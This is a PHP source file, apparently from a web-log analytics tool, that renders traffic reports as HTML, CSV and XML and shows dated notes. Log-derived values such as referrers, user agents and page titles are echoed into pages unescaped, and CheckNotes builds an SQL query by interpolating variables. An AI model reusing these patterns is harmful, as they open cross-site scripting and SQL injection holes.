    // define an array of columns that should be turned into a bar chart
    if (!isset($bchart)) { $bchart= array(); }
    array_push($bchart,_PAGEVIEWS,_REQUESTS,_HITS,_CRAWLED_PAGES,_UNIQUE_IPS ,_UNIQUE_IDS,_VISITORS,_TOTAL_REQUESTS,_TOTAL_PAGES,_VIEWED_PAGES,_VISITS,_BOTS,_EXITS,_SIZE_IN_MB,_RECORDS,_SALES ,_UNITS,_REVENUE,_AVERAGE_REVENUE_P_SALE,_RESPONSES,"Friends");
    ?>
    <script language="javascript" type="text/javascript">
    // Define our global variables.
        var conf_name="<?php echo $conf; ?>";
        var from_date=<?php echo !empty($from) ? $from : mktime(0, 0, 0, date('n'), date('j'), date('Y')); ?>;
        var to_date=<?php echo !empty($to) ? $to : mktime(23, 59, 59, date('n'), date('j'), date('Y')); ?>;
    
    // make the table sortable
 
        $(document).ready(function() { 
            $("#<?php echo $table_id; ?>").tablesorter( { textExtraction: 'complex' } ); 
        });
       
         
        
    </script>
    <?php
	if ($mini==2) {
        //we don't print a header at all
	} else if ($mini == 3) {
        PrintNewReportHeader($report_graph);
    } else if ($mini!=1) {
        PrintFullReportHeader();
	} else {
        PrintMiniReportHeader();
	}
    
    // if we are showing the world map do it now
    if ($labels == @_TOP_COUNTRIES_CITIES) {
        $xmlstr = makeMapXMLstr($conf,$from,$to);
        echo "<div id=\"mapArea\" style=\"width:100%;text-align:center;\">";
			if($mini == 3) {
				//include  "components/map/map_v3.php";
				echo "<iframe src='components/map/map_v3.php?conf={$conf}&from={$from}&to={$to}' style='border: 0; padding: 0; margin: 0; overflow: hidden;' width='100%' height='400'></iframe>";
			} else {
				include  "components/map/map.php";
			}
        echo "</div>";
    }
    ?>
    <table cellspacing=0 cellpadding=2 border=0 width="100%" id="<?php echo $table_id; ?>" class="tablesorter">
    <thead>
    <tr class="tabletotalcolor">
    <?php
	//Print the table headers
    if (@$addgraph!="") {
            // this must be the first one in the list or it wont work
            echo "<th width=250>"._GRAPH."</th>\n";
            //$addgraph="";            
    }
	$i=0;
	foreach($header as $thisheader) {
        echo "<th>$thisheader</th>\n";
		$i++;
	}
    echo "</tr>\n";
    echo "</thead><tbody>";
    if (@$addgraph!="") {
            // this must be the first one in the list or it wont work
            echo "<tr class=small><td width=250 rowspan=100 bgcolor=\"white\" valign=\"top\"><div style=\"position:absolute;padding:0px;\">$addgraph</div></td>\n";
            //$addgraph="";            
    }  
	
	//Print the values
	$foravg =1;
	$rn=0;
	$totals = array_fill(0, $i, 0);
	$maxval = array_fill(0, $i, 0);
	
	while (isset($data[$rn])) {
		$ii=0;
		while ($ii < $i) {
			$totals[$ii] = $totals[$ii] + $data[$rn][$ii];
			if ($maxval[$ii] < $data[$rn][$ii]) {
				 $maxval[$ii] = $data[$rn][$ii];
			}
			$ii++;
		}
		$rn++;
	}
	
	if($mini == 3 && @$report_graph['report_zerofill'] != 0) { $data = zeroFill($data); }
	
	$r = 0;
	$rn = 0;
    if (!empty($data)) {
	foreach ($data as $thisdatarow) {
		//echo "we have data";
		$ii=0;
		$rn++;
		//alternate bgcolor
		$r++;
		if ($r==2) {
			$gogray="#F8F8F8";
			$r=0;
		} else {
			$gogray=$tablemaincolor;
		}
		// print
		$graphcolor="";
        $rid=md5($labels); // this is used to make each menu id unique for the action menu, so it doesn't mess up when there are multple tables on one page
		//echo "<tr id=$ii bgcolor=$gogray class=small>";
        if (@$addgraph=="") {
            echo "<tr bgcolor=\"$gogray\" class=small>";
            //echo "<tr>";
		} else {
            $addgraph="";
        }
        while ($ii < $i) {
 			$thisheader = strip_tags($header[$ii]);
			if ($thisheader==_PAGE || $thisheader==_LANDING_PAGE) {
                $uparts = explode("##",$thisdatarow[$ii]);
                $thisdatarow[$ii] = $uparts[0];
                $title = @$uparts[1];
                $purl = $thisdatarow[$ii];
                if (strlen($purl) > 50) { $purl=substr($purl,0,50) . "..."; }
                if ($purl=="/") {
                  $purl="/ (Home Page)";
                }
                echo "<td class=\"pagecell\">";                
                if ($title!="") { 
                    echo "<span class=\"pagetitle\" title=\"$title\">";
                    if (strlen($title) > 100) {  echo substr($title,0,100) . "..."; } else { echo $title; } 
                    echo "</span><br />"; 
                }
                echo "<a class=\"small\" title=\""._CLICK_TO_OPEN_MENU_FOR." $thisdatarow[$ii]\" onclick=\"popupMenu(event, '".urlencode($thisdatarow[$ii])."', 'page');\" uri=\"$thisdatarow[$ii]\" href=\"\">". urldecode($purl) ."</a>";
                echo "</td>";        
			} else if ($thisheader==_PATH) {
                $path_parts=explode(" <img src=images/icons/arrow_right.gif> ",$thisdatarow[$ii]);
                $npp=array();                
                foreach ($path_parts as $page) {
                    $npp[]= "<span class='pathpart'>$page</span>";
                } 
                $thisdatarow[$ii] = implode(" <img src=images/icons/arrow_right.gif> ",$npp);
                echo "<td>". $thisdatarow[$ii] ."</td>";                
            } else if ($thisheader==_INTERNAL_KEYWORD) {
                echo "<td title=\"".urldecode($thisdatarow[$ii])."\">";
                
                if ($mini==1) {
                    echo substr(urldecode($thisdatarow[$ii]),0,30) ."";
                } else {
                    echo urldecode($thisdatarow[$ii]);
                }
                echo "</td>";
            } else if ($thisheader==_KEYWORDS) {
                echo "<td title=\"".urldecode($thisdatarow[$ii])."\">";
                //echo "<td title=\"".iconv("UTF-8", "ISO-8859-1", urldecode($thisdatarow[$ii]))."\">"; 
                
                echo "<a class=small title=\""._CLICK_TO_OPEN_MENU_FOR." $thisdatarow[$ii]\" onclick=\"popupMenu(event, '".urlencode($thisdatarow[$ii])."', 'keyword');\" href=\"\">";
                if ($mini==1) {
	                echo substr(urldecode($thisdatarow[$ii]),0,30) ."</a>";
                } else {
	                echo substr(urldecode($thisdatarow[$ii]),0,60) ."</a>";
                }
                echo "</td>";
			} else if ($thisheader==_REFERRER) {
                if (strpos($thisdatarow[$ii], "[G]")!==FALSE) {
                 $gsyn=substr($thisdatarow[$ii],3);
                 $thisdatarow[$ii]=$gsyn;
                 $gsyn="<img src=images/google.png border=0 alt='"._VIA_GOOGLE_ADS.": $gsyn'>&nbsp;";
                 $gsyncode="[G]";
                } else {
	                $gsyn="";
                    $gsyncode="";
                }
				$purl = $thisdatarow[$ii];
                if (strlen($purl) > 50) { $purl=substr($purl,0,50) . "..."; }
                echo "<td title=\"".$thisdatarow[$ii]."\">";
                echo "<a class=small title=\""._CLICK_TO_OPEN_MENU_FOR." $thisdatarow[$ii]\" onclick=\"popupMenu(event, '".urlencode($gsyncode.$thisdatarow[$ii])."', 'referrer');\" href=\"\">$gsyn". $purl ."</a>";
                echo "</td>"; 
			} else if ($thisheader==_USER_AGENT) {
				echo "<td><a class=small href=\"reports.php?agent=".md5($thisdatarow[$ii])."&from=$from&to=$to&conf=$conf&submit=Report&labels=_DETAILED_CRAWLER_REPORT\">". $thisdatarow[$ii] ."</a></td>";
			} else if ($thisheader==_IP_NUMBER) {
				//echo "<td width=\"50%\"><a class=small href=\"clicktrail.php?ip=".$thisdatarow[$ii]."&from=$from&to=$to&conf=$conf&submit=Report&labels="._DETAILED_USER_REPORT."\">". $thisdatarow[$ii] ."</a>";
                echo "<td width=\"50%\"><a class=small onclick=\"popupMenu(event, '".$thisdatarow[$ii]."', 'ipnumber');\" href=\"\">". $thisdatarow[$ii] ."</a>";
                
                if ($nograph!=1) {
                    echo " - <br><span id=\"ip$rn\" style=\"font-size:10px;\"><font color=silver>"._RESOLVING."....</font></span>\n";
                    //echo "<script language=\"javascript\" type=\"text/javascript\"> setTimeout(\"resolveIP('".$thisdatarow[$ii]."', 'ip$rn')\", ". ($rn*1500) ."); </script>\n";  
                    echo "<script language=\"javascript\" type=\"text/javascript\"> resolveIP('".$thisdatarow[$ii]."', 'ip$rn'); </script>\n";  
                }
                echo "</td>";
                $lastknownip=$thisdatarow[$ii];
			} else if ($thisheader==_PARAMETERS) {
				$purl = $thisdatarow[($ii-1)] . " " . $thisdatarow[$ii];
				if (strlen($purl) > 10) { $purl=substr($thisdatarow[$ii],0,7) . "..."; }
				
                echo "<td title=\"".$thisdatarow[$ii]."\">";
                echo "<a class=small title=\""._CLICK_TO_OPEN_MENU."\" onclick=\"popupMenu(event, '".urlencode($thisdatarow[$ii-1]).urlencode($thisdatarow[$ii])."', 'page');\" href=\"\">". $purl ."</a>";
                echo "</td>"; 
			} else if ($thisheader==_SEARCH_RESULT_PAGE) {
                /*
                $page="";
                parse_str($thisdatarow[$ii], $up_array);
                while (list ($key, $val) = each ($up_array)) {
                    if ($key=="start") {
                        $page=$val; 
                    } 
                }
                if (!@$page) {
                    $page=1;   
                } else {
                    $page=($page/10)+1;   
                }
                */
                echo "<td title=\"".$thisdatarow[$ii+1]."\">";
                echo $thisdatarow[$ii];// "$page";
                echo "</td>"; 
            } else if ($thisheader=="Status") {
					echo "<td><a class=small href=\"reports.php?status=".urlencode($thisdatarow[$ii])."&amp;from=$from&amp;to=$to&amp;conf=$conf&amp;submit=Report&amp;labels=".$thisdatarow[$ii]." "._ERROR_REPORT."&amp;search=$search&amp;searchmode=$searchmode\">". $thisdatarow[$ii] ."</a></td>";
			} else if ($thisheader==_COUNTRY) {
				if ($thisdatarow[$ii]) {
					$cparts=explode(", ", $thisdatarow[$ii]);
					$ccode = strtolower(((count($cparts) > 1) && ($cparts[1] > "")) ? $cparts[1] : $cparts[0]);
					$image= "<img hspace=3 width=14  height=11 src=\"images/flags/$ccode.png\" border=0 alt=\"$ccode\">";
					$countryname = @$cnames[$cparts[0]];
                    if (isset($gi) && @$lastknownip!="") {
                        $area=geoip_record_by_addr($gi, $lastknownip);
                        if ($area) {
                            $countryname=$area->country_name .", " . $area->city;
                        }
                        $lastknownip="";                 
                    }
				} else {
					$image = "";
					$countryname = "";
				}
				echo "<td>". $image ." <a class='small' href=\"reports.php?conf=$conf&amp;from=$from&amp;to=$to&amp;submit=Report&amp;labels="._TOP_CITIES."&amp;country=". $thisdatarow[$ii] ."\">". $countryname ."</a></td>";
			//} else if (($thisheader==_PAGEVIEWS || $thisheader==_REQUESTS || $thisheader==_HITS || $thisheader==_CRAWLED_PAGES  || $thisheader==_UNIQUE_IPS  || $thisheader==_UNIQUE_IDS || $thisheader==_VISITORS || $thisheader==_TOTAL_REQUESTS || $thisheader==_TOTAL_PAGES || $thisheader==_VIEWED_PAGES || $thisheader==_VISITS || $thisheader==_BOTS || $thisheader==_EXITS || $thisheader==_SIZE_IN_MB || $thisheader==_RECORDS || $thisheader==_SALES  || $thisheader==_UNITS || $thisheader==_REVENUE || $thisheader==_AVERAGE_REVENUE_P_SALE || $thisheader==_RESPONSES || $thisheader=="Friends") && ($nograph!=1)) {
            } else if (in_array($thisheader,$bchart) && ($nograph!=1)) {            
				@$val=$thisdatarow[$ii];
				if ($totals[$ii]>0){
					$perc = ($val/$totals[$ii])*100;
					$oriperc=$perc;
					
					$max = ($maxval[$ii]/$totals[$ii])*100;
					$point = 150/$max;
					$width = $point*$perc;
					$width=intval($width);
					$perc=intval($perc);
				} else {
					$perc=0;
					$oriperc=0;
					$width=0;
				}
				
				if ($graphcolor=="#EBECFB") {
					$graphcolor="#FBEBED";
				} else {
					$graphcolor="#EBECFB";
				}
				if ($labels==_DISABLE_FUNNEL_ANALYSIS) {
					//inflate low numbers
					if ($width < 20) {
						$imageleft ="";
						$imageright="";  
					} else {
						$imageleft ="<img src=images/funnelleft.gif>";
						$imageright="<img src=images/funnelright.gif>";   
					}
					
					echo "<td align=center><table cellpadding=0 cellspacing=0 border=0 class=small style=\"margin:0px;line-height:20px;\"><tr><td align=left valign=top>$imageleft</td><td width=\"$width\" class=graphborder_funnel align=center title=\"". number_format($oriperc,1) ." %\">&nbsp;".number_format($val)."&nbsp;";
					//echo " " . number_format($oriperc,1) . "($perc)";
					echo "</td><td align=right valign=top>$imageright</td></tr></table>";
				} else {
					if(is_numeric($val)) {
						$val = number_format($val);
					} else {
						$val = $val;
					}
					echo "<td style='white-space:nowrap;'><div class='graphborder' style='width:{$width}px;min-width:".(strlen($val)*7)."px;background-color:{$graphcolor};' title='".number_format($oriperc,1)." %'><span class='graphborder' style='background-color:{$graphcolor};border-right:0;'>".$val."</span></div>";
					/* Edited by Fabian
					echo "<td><table cellpadding=0 cellspacing=1 border=0 width=\"$width\" bgcolor=\"$graphcolor\" class=small><tr><td class=graphborder title=\"". number_format($oriperc,1) ." %\">".number_format($val)." ";
					*/
					
					//echo " " . number_format($oriperc,1) . "($perc)";
					
					/* Edited by Fabian
					echo "</td></tr></table>";
					*/
				}
			} else {
			    if (($thisheader==_PAGEVIEWS || $thisheader==_REQUESTS || $thisheader==_HITS || $thisheader==_TOTAL_HITS || $thisheader==_CRAWLED_PAGES  || $thisheader==_UNIQUE_IPS || $thisheader==_UNIQUE_IDS  || $thisheader==_BOT_REQUESTS || $thisheader==_VISITORS || $thisheader==_TOTAL_REQUESTS || $thisheader==_TOTAL_PAGES || $thisheader==_VIEWED_PAGES || $thisheader==_USERS ||$thisheader==_RECORDS)) {
			       $thisdatarow[$ii]=number_format($thisdatarow[$ii],0);
			    } else if (is_int($thisdatarow[$ii])==TRUE) {
					 $thisdatarow[$ii]=number_format($thisdatarow[$ii],0);
				} else if (is_numeric($thisdatarow[$ii]) == TRUE) {
                     $thisdatarow[$ii] = $thisdatarow[$ii] * 1; // turn it into a real number, not a string
                     if (is_int($thisdatarow[$ii])== TRUE) {
                        $thisdatarow[$ii]=number_format($thisdatarow[$ii],0);    
                     } else {
                        $thisdatarow[$ii]=number_format($thisdatarow[$ii],2);
                     }					 
				}
				if ($thisheader==_MEGABYTES) {
					 $thisdatarow[$ii]=number_format($thisdatarow[$ii],2);
				}
				if ($thisheader==_CONVERSION || $thisheader==_BOUNCE_RATE || $thisheader==_RETENTION_PERC || $thisheader==_VISIT_SHARE) {
					 $thisdatarow[$ii]=number_format($thisdatarow[$ii],2) . "%";
				}
				if ($thisdatarow[$ii] < 0) {
					echo "<td><font color=red>". $thisdatarow[$ii] ."</font></td>";
				} else {
					echo "<td>". $thisdatarow[$ii] ."</td>";   
				}
			}
			$ii++;
		}
		echo "</tr>\n";
	}
    } else {
        echo "<tr><td colspan=8 class=small>"._NO_DATA_IN_DATE_RANGE;
        if ($mini==1) {
            echo "<br>(".date("m/d/Y",$from)." - ".date("m/d/Y",$to).")";       
        }
        echo "</td></tr>";   
        
    }
	
    if (@$labels == _FUNNEL_ANALYSIS) {
            // this must be the first one in the list or it wont work
            echo "<tr class=small><td colspan='6'>&nbsp;</td></tr>";
            echo "<tr class=small><td colspan='6'>&nbsp;</td></tr>";
            echo "<tr class=small><td colspan='6'>&nbsp;</td></tr>";
            //$addgraph="";            
    } 
    echo "</tbody>";
	$ii=0;
	//Print the Totals
	if ($mini!=1 && $labels!=_FUNNEL_ANALYSIS) {
		echo "<tfoot><tr class=\"tabletotalcolor\">";
		while ($ii < $i) {
			if (trim($header[$ii])==_CONVERSION_RATE) {
					$totals[$ii]=0;
			} 
			if ($totals[$ii] < 10) { $ftype="2"; } else { $ftype="0"; }
			//if ($labels=="Funnel Analysis" && $header[$ii]=="Visitors") { 
			//    $totals[$ii] =0;
			//} 
			echo "<td><b>";
			if ($totals[$ii] != 0) {
				// this list says which columns not to produce a total for, we should probably change this to a list for which it should produce a total!
				if ($header[$ii]==_VISITS_PER_USER || $header[$ii]==_PAGES_PER_USER) {
					$a = ColumnArray($data,$ii);
					echo number_format((array_sum($a)/count($a)),2);
					//echo " median: ".median($a);    
				} else if ($header[$ii]!=_DATE && $header[$ii]!=_PAGES_PER_USER && $header[$ii]!=_HOUR && $header[$ii]!=_IP_NUMBER  && urldecode($header[$ii])!=_CRAWLED_PERC && $header[$ii]!=_PAGES_PER_IP && $header[$ii]!=_STATUS && $header[$ii]!=_CONVERSION_PERC && $header[$ii]!=_CONVERSION_PERC && $header[$ii]!=_BOUNCE_RATE && $header[$ii]!=_RETENTION_PERC && $header[$ii]!=_SEARCHES_PER_USER && $header[$ii]!=_AVERAGE_DURATION_IN_MINUTES && $header[$ii]!=_TIME_SPENT && $header[$ii]!=_VISIT_SHARE && strip_tags($header[$ii])!=_CONVERSION && $header[$ii]!=_INTERNAL_KEYWORD && $header[$ii]!=_KEYWORDS) {
					echo number_format($totals[$ii], $ftype);
				}
			}
			echo "</b></td>";
			$ii++;
		}
	 echo "</tr></tfoot>\n";
	}
    echo "</table>";
    //reset nograph
    $nograph=0;
	
	if(!empty($opengraph)) {
		echo "<script type='text/javascript'>";
		echo "var graphdata = [
			[
				//days
			],
			[
				
			],
			[
				
			]
			]";
		echo "plotGraph($('.graphcontainer'),graphdata);";
		echo "</script>";
		return;
	}
}

function CSVStatsTable($from,$to,$showfields,$labels,$query,$drilldown="",$filter="") {
	
	global $conf,$mini,$nototal,$addlabel,$nograph,$status,$agent,$help,$print,$cnames,$profile,$limit,$data;
	global $db, $trafficsource;

	$nicefrom = date("D, d M Y / H:i",$from);
	$niceto = date("D, d M Y / H:i",$to);
	$header = explode(",",$showfields);
  
    echo "\"".str_replace("%20"," ",$labels); 
    echo " ".strip_tags(printSegmentName()); 
    echo " "._DATE_FROM." $nicefrom $niceto\"\r\n";
	//Print the table headers
	$i=0;
	foreach($header as $thisheader) {
		echo "\"$thisheader\",";
		$i++;
	}
	echo "\r\n";
	
	//Get the report data
    if ($query=="data array") {
        // $data has been created outside this function, just continue    
    } else {
        //make data
	    $result = $db->Execute($query);
	    if (!$result) {
		    echo _ERROR_EXECUTING_QUERY.": " . $db->ErrorMsg()."</p>";
		    return;
	    }
	    $foravg =1;
	    $rn=0;
	    $data = array(); // Initialize it to an array just in case we don't have any results back.

	    while ($newdata = $result->FetchRow()) {
		    $ii=0;
		    while ($ii < $i) {
			    $data[$rn][$ii]=$newdata[$ii];
			    $ii++;
		    }
		    $rn++;
	    }
    }
    //Print the data 
	$r = 0;
	foreach ($data as $thisdatarow) {
		//echo "we have data";
		$ii=0;
		
		while ($ii < $i) {
            if (($labels==_MOST_ACTIVE_USERS || $labels==_RECENT_VISITORS) && $header[$ii]==_IP_NUMBER) {
                $thisdatarow[$ii]=gethostbyaddr($thisdatarow[$ii])." - ".$thisdatarow[$ii];
            }
            if ($header[$ii]==_PAGE || $header[$ii]==_LANDING_PAGE) {
                $uparts = explode("##",$thisdatarow[$ii]);
                $thisdatarow[$ii] = $uparts[0];        
            }
			echo "\"". $thisdatarow[$ii] ."\",";
			$ii++;
		}
		echo "\r\n";
	}
}

function SimpleStatsTable($from,$to,$showfields,$labels,$query,$drilldown="",$filter="") {
    
    global $conf,$mini,$nototal,$addlabel,$nograph,$status,$agent,$help,$print,$cnames,$profile,$limit,$data;
    global $db, $trafficsource;

    $nicefrom = date("D, d M Y / H:i",$from);
    $niceto = date("D, d M Y / H:i",$to);
    $header = explode(",",$showfields);
  
    echo "<div class=\"report_title\">".str_replace("%20"," ",$labels); 
    echo "<span class=\"segment_name\">".strip_tags(printSegmentName())."</span></div>\n"; 
    echo "<div class=\"date_line\">$nicefrom - $niceto</div>\r\n";
    echo "<div class=\"report_table\"><table><tr>\n";
    //Print the table headers
    $i=0;
    foreach($header as $thisheader) {
        echo "<th>$thisheader</th>";
        $i++;
    }
    echo "</tr>\r\n";
    
    //Get the report data
    if ($query=="data array") {
        // $data has been created outside this function, just continue    
    } else {
        //make data
        $result = $db->Execute($query);
        if (!$result) {
            echo _ERROR_EXECUTING_QUERY.": " . $db->ErrorMsg()."</p>";
            return;
        }
        $foravg =1;
        $rn=0;
        $data = array(); // Initialize it to an array just in case we don't have any results back.
        while ($newdata = $result->FetchRow()) {
            $ii=0;
            while ($ii < $i) {
                $data[$rn][$ii]=$newdata[$ii];
                $ii++;
            }
            $rn++;
        }
    }
    //Print the data 
    $r = 0;
    foreach ($data as $thisdatarow) {
        echo "<tr>";
        $ii=0;        
        while ($ii < $i) {
            if (($labels==_MOST_ACTIVE_USERS || $labels==_RECENT_VISITORS) && $header[$ii]==_IP_NUMBER) {
                $thisdatarow[$ii]=gethostbyaddr($thisdatarow[$ii])." - ".$thisdatarow[$ii];
            }
            if (is_numeric($thisdatarow[$ii])) {                
                if (strpos($thisdatarow[$ii],".")!==false) {
                    $thisdatarow[$ii] = number_format($thisdatarow[$ii],2);
                } else {
                    $thisdatarow[$ii] = number_format($thisdatarow[$ii]);
                } 
            }
            if ($header[$ii]==_VISIT_SHARE) {
                $thisdatarow[$ii] = number_format($thisdatarow[$ii],2) . "%";        
            }
            if ($header[$ii]==_PAGE || $header[$ii]==_LANDING_PAGE) {
                $uparts = explode("##",$thisdatarow[$ii]);
                $thisdatarow[$ii] = $uparts[0];        
            }
            echo "<td>". $thisdatarow[$ii] ."</td>";
            $ii++;
        }
        echo "</tr>\r\n";
    }
    echo "</table></div>\r\n";
}

function XMLStatsTable($from,$to,$showfields,$labels,$query,$drilldown="",$filter="") {
    global $conf,$mini,$nototal,$addlabel,$nograph,$status,$agent,$help,$print,$cnames,$profile,$limit,$data;
    global $db;

    $nicefrom = date("D, d M Y / H:i",$from);
    $niceto = date("D, d M Y / H:i",$to);
    $header = explode(",",$showfields);
    
	iconv_set_encoding('output_encoding', 'UTF-8');
	// iconv_set_encoding('input_encoding', 'UTF-8');
	// iconv_set_encoding('internal_encoding', 'UTF-8');
    /*echo "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"; */
    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>";
    //echo "\"".str_replace("%20"," ",$labels); echo " "._DATE_FROM." $nicefrom $niceto\"\r\n";
    //Print the table headers
    
    $i=0;
    foreach($header as $thisheader) {
        //echo "\"$thisheader\",";
        $i++;
    }
    if($query != "data array") {
        //Print the values
        $result = $db->Execute($query);
        if (!$result) {
            echo _ERROR_EXECUTING_QUERY.": " . $db->ErrorMsg()."</p>";
            return;
        }
        $foravg =1;
        $rn=0;
        $data = array(); // Initialize it to an array just in case we don't have any results back.

        while ($newdata = $result->FetchRow()) {
            $ii=0;
            while ($ii < $i) {
                $data[$rn][$ii]=$newdata[$ii];
                $ii++;
            }
            $rn++;
        }
    }
    $r = 0;
    
    echo "\n<dataset id=\"".$labels."\" >\n";
    if (strtolower($labels)==strtolower("Top Continents") || strtolower($labels)==strtolower(_TOP_COUNTRIES_CITIES) || strtolower($labels)==strtolower("Top Cities Map")) {
        foreach ($data as $thisdatarow) {
            //echo "we have data";
            $ii=0;
            echo "\t<entry ";
            while ($ii < $i) {
                //echo strtolower(str_replace(" ","_",$header[$ii]))."='".$thisdatarow[$ii]."' ".strtolower(str_replace(" ","_",$header[$ii]))."Prefix"."='' ".strtolower(str_replace(" ","_",$header[$ii]))."Suffix"."='' ".strtolower(str_replace(" ","_",$header[$ii]))."Color='009900' ";
                if(strtolower($header[$ii]) != strtolower(_COUNTRY)
                    && strtolower($header[$ii]) != strtolower(_CITY)
                    && strtolower($header[$ii]) != strtolower("CONTINENT")
                    && strtolower($header[$ii]) != strtolower('longitude')
                    && strtolower($header[$ii]) != strtolower('latitude')
                ) {
                    echo "value".$ii."Name=\"".$header[$ii]."\" ";
                    echo "value".$ii."Value='".$thisdatarow[$ii]."' ";
                    echo "value".$ii."Prefix='' ";
                    echo "value".$ii."Suffix='' ";
                    echo "value".$ii."Color='D63C06' ";
                }
                if(strtolower($header[$ii]) == strtolower(_COUNTRY)) {
                    echo "country='".$thisdatarow[$ii]."' ";
                    echo "countryPrefix='' ";
                    echo "countrySuffix='' ";
                }
                if(strtolower($header[$ii]) == strtolower(_CITY)) {
                    //echo "city='<![CDATA[".$thisdatarow[$ii]."]]>' ";
                    echo "city=\"".$thisdatarow[$ii]."\" ";
                    echo "cityPrefix='' ";
                    echo "citySuffix='' ";
                }
                if(strtolower($header[$ii]) == strtolower("CONTINENT")) {
                    echo "continent=\"".$thisdatarow[$ii]."\" ";
                    echo "continentPrefix='' ";
                    echo "continentSuffix='' ";
                }
                if(strtolower($header[$ii]) == strtolower('longitude')) {
                    echo "longitude='".$thisdatarow[$ii]."' ";
                }
                if(strtolower($header[$ii]) == strtolower('latitude')) {
                    echo "latitude='".$thisdatarow[$ii]."' ";
                }
                $ii++;
                if($ii > 3) { break; }
            }
            echo "/>\n";
        }
    } else {
        foreach ($data as $thisdatarow) {
            $ii=0;
            echo "\t<entry ";
            while ($ii < $i) {
                if (($labels==_MOST_ACTIVE_USERS || $labels==_RECENT_VISITORS) && $header[$ii]==_IP_NUMBER) {
                    $thisdatarow[$ii]=gethostbyaddr($thisdatarow[$ii])." - ".$thisdatarow[$ii];
                }
                if ($header[$ii]==_PAGE || $header[$ii]==_LANDING_PAGE) {
                    $uparts = explode("##",$thisdatarow[$ii]);
                    $thisdatarow[$ii] = $uparts[0];        
                }
                //echo strtolower(str_replace(" ","_",$header[$ii]))."='".$thisdatarow[$ii]."' ".strtolower(str_replace(" ","_",$header[$ii]))."Prefix"."='' ".strtolower(str_replace(" ","_",$header[$ii]))."Suffix"."='' ".strtolower(str_replace(" ","_",$header[$ii]))."Color='009900' ";
                echo strtolower(str_replace(" ","_",$header[$ii]))."='".safeXML($thisdatarow[$ii])."' ";
                $ii++;
            }
            echo "/>\n";
        }
    }
    echo "</dataset>";
}

function safeXML($xmlString = "") {
	$xmlString = iconv('ISO-8859-1', "UTF-8", $xmlString);
	$xmlString = str_replace("&", "&amp;", $xmlString);
	$xmlString = str_replace(">", "&gt;", $xmlString);
	$xmlString = str_replace("<", "&lt;", $xmlString);
	$xmlString = str_replace("'", "&apos;", $xmlString);
	$xmlString = str_replace('"', "&quot;", $xmlString);
	return $xmlString;
}

function CheckNotes($nlimit = 5, $noprint = false) {
	global $conf,$to,$from,$mysqlprefix,$db;

	if ($from) {
		$q=$db->Execute("select *,FROM_UNIXTIME(timestamp,'%d-%b-%Y %a') as day from ".TBL_NOTES." where profile='$conf' and (timestamp >=$from and timestamp <=$to or timestamp=\"0\") order by timestamp desc limit $nlimit");
		
		if($noprint == false) {
			$i=0;
			$disp="";
			while ($data=@$q->FetchRow()) {
				$disp.= "<font color=gray>".$data["day"]."</font> - ".$data["note"];
				$disp.= " &nbsp;&nbsp;<a class=graylink href=\"notes.php?conf=$conf&amp;donote=edit&amp;noteid=".$data["id"]."\">"._EDIT."</a>";
				$disp.= "  <a class=graylink href=\"notes.php?conf=$conf&amp;donote=del&amp;noteid=".$data["id"]."\">Del</a><br>";
				$i++;
			}
			$now=time();
			if (!@$disp) {
				echo "<div class=notes><table width=500 cellpadding=3 cellspacing=0 class=small border=0><tr class=small><td class=toplinegray valign=top>";
				echo "<a class=nodec3 href=\"notes.php?conf=$conf&amp;timestamp=$now&amp;donote=create\"><img src=\"images/icons/note_add.gif\" width=\"14\" height=\"14\" border=\"0\" align=\"left\" alt=\"\"></a> "._NO_NOTES.", <a class=nodec3 href=\"notes.php?conf=$conf&amp;timestamp=$now&amp;donote=create\">"._NEW_NOTE."</a></td></tr></table></div>";
			} else { 
				echo "<div class=notes><table width=500 cellpadding=3 cellspacing=0 class=small border=0><tr class=small bgcolor=\"#FEFEEA\"><td class=toplineyellow valign=top><img src=\"images/icons/notes.gif\" width=12 height=12 border=0 align=left alt=\"Notes\"></td><td class=toplineyellow valign=top>$disp</td><td valign=top class=toplineyellow>";
				echo "<a class=nodec3 href=\"notes.php?conf=$conf&amp;timestamp=$now&amp;donote=create\">"._MORE_NOTES."</a></td>";
				echo "</tr></table></div>";
			}
		} else {
			$notes = array();
			while ($data=@$q->FetchRow()) {
				$notes[] = $data;
			}
			
			return $notes;
		}
	}
}

function newselec($url) {
  if (strpos($_SERVER["PHP_SELF"], "reports.php")!=FALSE  && $url=="index.php") { 
      echo "class=current_page_item";
  } else if (strpos($_SERVER["PHP_SELF"], $url)!=FALSE) {
			 echo "class=current_page_item";
	 } else {
			 echo "class=page_item";
	 }
}

function newrselec($url) {
	 if (strpos($_SERVER["PHP_SELF"], "reports.php")!=FALSE  && $url=="index.php") { 
      echo "class=selectedtabcenter";
  } else if (strpos($_SERVER["PHP_SELF"], $url)!=FALSE) {
			 echo "class=selectedtabcenter";
	 } else {
			 echo "class=tabcenter";
	 }
}
function iconselect($url) {
	 if ((strpos($_SERVER["PHP_SELF"], "index.php")!=FALSE || strpos($_SERVER["PHP_SELF"], "reports.php")!=FALSE) && $url=="index.php") {
    echo "<img src=\"images/icons/summary.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
   if (strpos($_SERVER["PHP_SELF"], "profiles.php")!=FALSE && $url=="profiles.php") {
    echo "<img src=\"images/icons/profiles.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
   if (strpos($_SERVER["PHP_SELF"], "reports.php")!=FALSE && $url=="reports.php") {
    echo "<img src=\"images/icons/summary.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }

  if (strpos($_SERVER["PHP_SELF"], "trends.php")!=FALSE && $url=="trends.php") {
    echo "<img src=\"images/icons/chart_line.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
   if (strpos($_SERVER["PHP_SELF"], "page.php")!=FALSE && $url=="page.php") {
    echo "<img src=\"images/icons/page_analysis.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
   if (strpos($_SERVER["PHP_SELF"], "clicktrail.php")!=FALSE && $url=="clicktrail.php") {
    echo "<img src=\"images/icons/mouse_add.gif\" width=\"16\" height=\"16\" align=\"left\" vspace=\"9\" alt=\"icon\"  border=\"0\" hspace=\"5\">";
   }
   
